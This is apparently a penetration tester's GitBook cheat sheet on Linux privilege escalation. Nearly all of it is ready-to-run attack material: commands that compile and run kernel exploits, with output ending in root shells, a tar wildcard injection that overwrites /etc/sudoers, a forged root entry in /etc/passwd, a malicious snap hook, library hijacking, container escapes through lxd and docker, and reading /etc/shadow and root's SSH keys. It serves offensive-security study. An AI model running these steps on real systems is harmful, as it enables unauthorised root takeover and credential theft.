---
description: >-
  Privilege Escalation usually involves going from a lower permission to a
  higher permission.
---

# Linux Privesc

## Enumeration Scripts:

There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples:

* **LinEnum**: [https://github.com/rebootuser/LinEnum/](https://github.com/rebootuser/LinEnum/)
* **LinPEAS**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)/

## Kernel Vulnerabilities

We can exploit some kernel vulnerabilities in order to privesc. `linux-exploit-suggester.sh` is an amazing script that do this work.

{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}

```text
./linux-exploit-suggester.sh
```

### Compiling Exploits

Sometimes we need to compile our exploits in order to get the binary or executable.

For **64-bits:**

```text
gcc exploit.c -o exploit
```

For **32-bits:**

```text
gcc -m32 exploit.c -o exploit

#i686 and older devices
gcc -march=i686 -m32 -Wl,--hash-style=both exploit.c -o exploit
```

Finally we just need to give execution permissions.

```text
chmod u+x executablename
./executablename
```

### eBPF\_verifier - Linux Kernel &lt; 4.13.9

```text
$ gcc cve-2017-16995.c -o cve-2017-16995
$ chmod +x cve-2017-16995

$ ./cve-2017-16995
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88002dc42800
[*] Leaking sock struct from ffff88003d00d400
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff8800354a0600
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff8800354a0600
[*] credentials patched, launching shell...

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

```

{% embed url="https://www.exploit-db.com/exploits/45010" %}

### DirtyC0w - Linux Kernel 2.6.22 &lt; 3.9

```text
gcc -pthread dirty.c -o dirty -lcrypt
```

Transfer the exploit to the target machine.

```text
chmod +x dirty
./dirty
```

{% embed url="https://github.com/FireFart/dirtycow/blob/master/dirty.c" %}

### Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 \(Gentoo / Ubuntu x86/x64\)

```text
$ gcc mempodipper.c -o mempodipper
$ chmod +x mempodipper

$ ./mempodipper
===============================
=          Mempodipper        =
=           by zx2c4          =
=         Jan 21, 2012        =
===============================

[+] Waiting for transferred fd in parent.
[+] Executing child from child fork.
[+] Opening parent mem /proc/1977/mem in child.
[+] Sending fd 3 to parent.
[+] Received fd at 5.
[+] Assigning fd 5 to stderr.
[+] Reading su for exit@plt.
[+] Resolved exit@plt to 0x8049520.
[+] Calculating su padding.
[+] Seeking to offset 0x8049514.
[+] Executing su with shellcode.
# whoami
root
#
```

{% embed url="https://www.exploit-db.com/exploits/18411" %}

## Abusing SUID/GUID Files

Check for files with the SUID/GUID bit set. This means that the file or files can be **run with permissions of the file\(s\) owner/group**. In case of super-user, we can leverage this to get a shell with these privileges.

But when a special permission is given to each user it becomes SUID or SGID. When a extra bit "4" is set to user \(Owner\) it becomes SUID \(Set user ID\) and wen bit  "2" is set to group it becomes SGID \(Set Group ID\).

**SUID:** `rws-rwx-rws`    **GUID:** `rwx-rws-rwx`

| **Permission** | **On Files** | **On Directories** |
| :---: | :---: | :---: |
| SUID Bit | User executes the file with permissions of the _file_ owner. | - |
| SGID Bit | User executes the file with the permission of the _group_ owner. | File created in directory gets the same group owner. |
| Sticky Bit | - | Users are prevented from deleting files from others users. |

![SUID, SGID and Sticky Bit](../.gitbook/assets/sgid.png)

### **Finding SUID / GUID Binaries:**

```text
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

### Exploiting PATH Variable

`PATH` is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the `PATH` Variable in response to commands executed by a user.

**How does this let us escalate privileges?**

Let's say we need an **SUID binary**. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". We can rewrite the `PATH`  variable to a location of our choice. So when the SUID binary calls the system shell to run an executable, it runs one that we have written instead. So we need to change the `PATH` variable:

```text
export PATH=/tmp
echo $PATH
```

And create a file with execution permissions with the same binary name:

```text
echo "/bin/bash" > /tmp/ps
/bin/chmod +x /tmp/ps
```

Finally when the SUID files calls `ps` function, instead of showing system processes will execute our command.

{% hint style="warning" %}
**Remember**: To exploit PATH variable **we need a SUID File** to gain privileges otherwise it will be executed as normal user.
{% endhint %}

## Writeable Folders

We can elevate our privileges some times when we have write permissions in some specific directories.

{% hint style="info" %}
**Note**: With write permissions on the folder we can **create/delete/move files** but not modify them.
{% endhint %}

### On PATH variable

When we can write on folders such as `/usr/local/bin` `/usr/bin` or some others that are included on the PATH variable we can escalate our privileges by **modifying or creating a new binary** that will be executed as **root**.

#### SSH port open

When we ssh a machine root executes `run-parts` binary so we add a malicious binary on the path. Look [Executing files with root ](https://mvc1009.gitbook.io/hackingnotes/privilege-escalation/linux-privesc#executing-files-with-root)to see which binary we can fit our needs.

## Abusing Wildcards \(\*\)

### Tar Argument Injection in root cronjob

Imagine you compromise a low-level user on a system and you figure out this command is running as root:

```text
cd /var/log/mon && tar -zcf /tmp/mon.tar.gz *
```

We want to go with **sudoers** **file** as we are lazy and just sudo bash, so let's see....

```text
echo 'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1
```



## Writeable /etc/passwd

The `/etc/passwd` file stores essential information, which is required during login. In other words, it stores user account information.

if we have a writable `/etc/passwd` file, we can write a new line entry allowing us to log in as our own root user. But first, we need to create a compliant password hash.

```text
openssl passwd -1 -salt [username] [password]
openssl passwd [password]
```

Finally append the following string to  `/etc/passwd` file:

```text
[USERNAME]:[HASH]:0:0:root:/root:/bin/bash
```

And finally su to this new user to obtain a **root** **shell**:

```text
su [USERNAME]
```

## GTFOBins

GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

Firstly, we need to check the sudo permissions on binaries:

```text
sudo -l
```

After that search on [GTOBins web ](https://gtfobins.github.io/)to search how to escape from that binary and obtain a shell:

* [https://gtfobins.github.io/](https://gtfobins.github.io/)

```text
User user may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/someBinary
```

{% hint style="warning" %}
**Remember**: Do **not** **forget** to run the command as **sudo!**
{% endhint %}

### SETENV permission

This mean that we can set some environment variables to run the command.

```text
User user may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/some.py
```

Search for a library, create a copy in `/tmp` and execute commands.

```text
some.py

import sys
sys.exit(10)
```

We can create a sys.py file on `/tmp`.

```text
import os
def exit(a):
        os.system("cp /bin/bash /tmp/rev")
        os.system("chmod u+s /tmp/rev")
```

Finally open the backdoor.

```text
/tmp/rev -p
rev-4.4# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```

### Snap install

```text
User user may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

When we find the following, we can install any malicious packet, so we will add our malicious personal crafted snap packet.

{% embed url="https://ubuntu.com/tutorials/create-your-first-snap\#3-building-a-snap-is-easy" caption="Create your first snap, useful to install the requeriments" %}

{% embed url="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html" caption="Example used in dirty\_sock exploit" %}

```text
mkdir privesnap
cd privesnap
snapcraft init

touch snap/hooks/install
```

We need to create a malicious `snap/hooks/install` file, and modify `snap/snapcraft.yaml`

{% tabs %}
{% tab title="install" %}
```text
#!/bin/bash

# dirty_sock:dirty_sock
useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
```
{% endtab %}

{% tab title="snapcraft.yaml" %}
```text
name: privesnap
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
```
{% endtab %}
{% endtabs %}

## Linux Capabilities

> Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.

```text
getcap -r / 2>/dev/null
```

Check the following link to see what means each capability:

{% embed url="https://man7.org/linux/man-pages/man7/capabilities.7.html\#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute." %}

{% hint style="info" %}
Note: **`ep`** capability means that can read and write any file on the filesystem.
{% endhint %}

More info in:

{% embed url="https://linux-audit.com/linux-capabilities-101/" %}



## Exploiting Crontab

The `Cron` daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as on-time events or as recurring tasks.

**To view what cronjobs are active** we need to cat the `/etc/crontab` file:

```text
cat /etc/crontab
```

If we find a script that is scheduled to run as user root and we can write to this file, we can modify it to get a reverse shell when the cronjob run the task.

## Abusing privileges \(Group memberships\)

### sudo

Thats it, you're already root:

```text
sudo su -
```

### lxd

A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.

#### With Internet

```text
lxc init ubuntu:16:04 myimage -c security.privileged=true
lxc config device add myimage whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash
```

#### Without Internet

Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

```text
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
```

Also you can download directly the image from ubuntu:

```text
wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-lxd.tar.xz
And exploit it:
```

```text
# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
lxc image import xenial-server-cloudimg-amd64-*.tar.xz --alias myimage # Or this depending if you downloaded

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

### adm

All members of the group `admin` have access to logs files:

```text
/var/log/
```

### disk

All members of the gorup `disk` have full access to the filesystem.

```text
df -h #search disk

debugfs /dev/sda1
debugfs: cd /root
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

We can also write files on the filesystem.

```text
debugfs -w /dev/sda1
debugfs: dump file1.txt file2.txt  #Copy file1.txt to file2.txt
```

{% hint style="info" %}
**Hint**: Files owned by root are now writable such as `/etc/passwd` or `/etc/shadow`.
{% endhint %}

### video

The video group has access to view the screen output of all opened sessions \(tty\). With `w` command we can see the who is logged on the server:

```text
moshe@falafel:/var/log$ w
 17:35:42 up  3:40,  3 users,  load average: 0.22, 0.09, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      13:55    3:40m  0.05s  0.04s -bash
moshe    pts/0    10.10.14.20      17:18    0.00s  0.08s  0.00s w
moshe    pts/1    10.10.14.20      17:18   15:17   0.03s  0.03s bash
```

So we need to grab the video output and graphics configuration.

```text
moshe@falafel:/var/log$ cat /dev/fb0 > /tmp/screen.raw
moshe@falafel:/var/log$ cat /sys/class/graphics/fb0/virtual_size
1176,885
```

Finally we can open the data with GIMP.

![](../.gitbook/assets/video.png)

### docker

Since we are member of docker group, we can mount the root filesystem of the host machine to an instance's volume.

```text
$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              775349758637        22 months ago       64.2MB
alpine              latest              965ea09ff2eb        22 months ago       5.55MB
centos              latest              0f3e07c0138f        23 months ago       220MB

$ docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash

# Edit /etc/passwd to get root access to the host
```

We can also mount the filesystem and the network access.

```text
$ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```

## Docker Breakout

### Privileged Flag enabled

When we start a docker with the privileged flag `--privileged` , we give the sufficient permission to mount the host filesystem inside the docker.

When the `root` user is owned, we will search the host drive:

```text
fdisk -l
```

After finding the Linux sda we will mount it:

```text
mkdir -p /mnt/host_drive
mount /dev/sda1 /mnt/host_drive
```

Finally, just `cd` to out new mount point to find all host files.

### Docker.sock available

By default, when the `docker` command is executed on a host, an API call to the docker daemon is made via a non-networked UNIX socket located at `/var/run/docker.sock`. However, many containers and guides require you to expose this socket file as a volume within a container or in some cases, expose it on a TCP port. Docker containers that expose `/var/run/docker.sock`, locally or remotely, could lead to a full environment take over.

#### Check if socket is available

```text
ls -alh /var/run/docker.sock
```

#### List all containers

```text
curl -ik --unix-socket /var/run/docker.sock http://<docker_host>:PORT/containers/json
```

#### Create an exec

```text
curl -ik -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://<docker_host>:PORT/containers/<container_id>/exec
```

#### Start the exec

```text
curl -ik -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" --data-binary '{"Detach": false,"Tty": true} http://<docker_host>:PORT/exec/<exec_id>/start' 
```

* [https://dejandayoff.com/the-danger-of-exposing-docker.sock/](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)

## USBCreator D-Bus

A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the **sudoer group to bypass the password** security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – **without supplying a password.**

```text
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /id_rsa true
```

* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

## Executing files with root

### Adding a new SUDOER user \(Bash\)

We can create a new user and add it to the sudoers file:

```text
#!/bin/bash

useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

### Creating a SUID shell \(bash\)

We can copy the bash file to temp and give it SUID permissions.

```text
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash

/tmp/bash -p
```

### Creating a SUID file \(c\)

```text
#include <unistd.h>
int main()
{
    setreuid(0,0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

### Creating a SUID shell \(C\)

We can write the following C code in order to obtain a bash shell:

```text
#include <stdio.h>
#include <unistd.h>

int main (void) {
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}
```

We just need to compile and give SUID permissions from root in our attacking machine.

```text
gcc -m32 shell.c -o shell
root@kali $ chmod +s shell
```

Finally we need to transfer the file with the command execution.

```text
/tmp/shell -p
```

## Capabilities

Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.

Search files with capabilities:

```text
getcap -r / 2>/dev/null
```

### Python Capability

```text
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## References:

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
* [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
* [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)
* [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)
* [https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e](https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e)
* [https://book.hacktricks.xyz/linux-unix/privilege-escalation/](https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash)
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
* [https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)





